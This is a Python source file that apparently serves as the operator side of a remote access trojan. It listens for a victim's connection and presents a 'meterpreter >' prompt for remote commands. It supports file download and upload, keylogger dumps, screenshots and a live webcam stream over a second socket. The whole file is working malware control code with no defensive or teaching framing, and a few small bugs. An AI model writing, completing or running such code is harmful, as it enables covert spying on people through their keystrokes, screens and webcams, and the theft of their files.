import socket
import json
import os
import struct
import pickle
import cv2
import threading

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('#', 9999)) # Enter your ip address in '#'
print('Waiting for connection ...')
sock.listen(1)

connect = sock.accept()
_target = connect[0]
ip = connect[1]
print(_target)
print(f'Connected to {str(ip)}')

def data_received():
    data = ''
    while True:
        try:
            data = data + _target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
        
def download_file(filename):
    file = open(filename, 'wb')
    _target.settimeout(1)
    _file = _target.recv(1024)
    while _file:
        file.write(_file)
        try:
            _file = _target.recv(1024)
        except socket.timeout as e:
            break
    _target.settimeout(None)
    file.close

def file_upload(filename):
    file = open(filename, 'rb')
    _target.send(file.read())
    file.close

def convert_byte_stream():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('#', 4444)) # Enter your ip address in '#'
    sock.listen(5)
    connect = sock.accept()
    target = connect[0]
    ip = connect[1]

    bdata = b""
    payload_size = struct.calcsize("Q")

    while True:
        while (len(bdata)) < payload_size:
            packet = target.recv(4*1024)
            if not packet: break
            bdata + packet

        packed_msg_size = bdata[:payload_size]
        bdata = bdata[payload_size:]
        msg_size = struct.unpack("Q", packed_msg_size)[0]
        while len(bdata) < msg_size:
            bdata += target.recv(4*1024)
        frame_data = bdata[:msg_size]
        bdata = bdata[msg_size:]
        frame = pickle.loads(frame_data)
        cv2.imshow("Are recording ...", frame)
        key = cv2.waitKey(1)
        if key == 27:
            break
    target.close()
    cv2.destroyAllWindows()

def stream_cam():
    t = threading.Thread(target=convert_byte_stream)
    t.start()

def shell():
    n = 0
    while True:
        command = input('meterpreter > ')
        data = json.dumps(command)
        _target.send(data.encode())
        if command in ('exit', 'quit'):
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:6] == 'upload':
            file_upload(command[7:])
        elif command == 'keylogger_start':
            pass
        elif command == 'keylogger_dump':
            data = _target.recv(1024).decode()
            print(data)
        elif command == 'keylogger_stop':
            pass
        elif command == 'webcam_stream':
            stream_cam()
        elif command == 'screenshot':
            n += 1
            file = open('screenshot'+str(n)+".png", 'wb')
            _target.settimeout(3)
            _file = _target.recv(1024)
            while _file:
                file.write(_file)
                try:
                    _file = _target.recv(1024)
                except socket.timeout as e:
                    break
            _target.settimeout(None)
            file.close
        else:
          result = data_received()
          print(result)

shell()
